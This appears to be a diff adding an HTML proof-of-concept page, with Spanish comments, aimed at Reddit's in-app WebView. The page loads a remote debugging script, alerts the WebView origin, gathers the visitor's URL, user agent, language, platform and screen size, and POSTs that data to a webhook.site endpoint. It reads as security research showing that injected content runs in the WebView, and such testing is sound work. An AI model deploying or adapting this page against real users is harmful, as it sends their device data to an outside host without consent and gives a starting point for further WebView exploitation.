@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Reddit WebView PoC</title>
+
+<!-- 0) El depurador de Firebug Lite ya no se mantiene; usa eruda.io (60 KB) -->
+<script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+<script>eruda.init();</script>
+
+<style>
+  body   { background:#111; color:#eee; font:14px/1.4 monospace }
+  h1,h2  { margin:0 0 12px }
+  pre    { white-space:pre-wrap; word-break:break-all }
+</style>
+</head>
+<body>
+
+<script>
+(async () => {
+  /* 1) Muestra origen y fecha de forma legible */
+  const now  = new Date().toISOString();
+  const page = location.href;
+  alert(`WebView origin = ${location.origin}`);
+
+  /* 2) Recolecta datos relevantes del entorno */
+  const env = {
+    origin : location.origin,
+    href   : location.href,
+    ua     : navigator.userAgent,
+    lang   : navigator.language,
+    plat   : navigator.platform,
+    scrW   : screen.width,
+    scrH   : screen.height,
+    time   : now
+  };
+
+  /* 3) Refleja en pantalla para captura de pantalla */
+  document.body.innerHTML =
+      `<h1>${page}</h1><h2>${now}</h2><pre>${JSON.stringify(env, null, 2)}</pre>`;
+
+  /* 4) Envía a tu endpoint (usa fetch + JSON) */
+  try {
+    await fetch('https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2', {
+      method : 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body   : JSON.stringify(env)
+    });
+  } catch (e) {
+    console.error('Webhook error', e);
+  }
+})();
+</script>
+</body>
+</html>
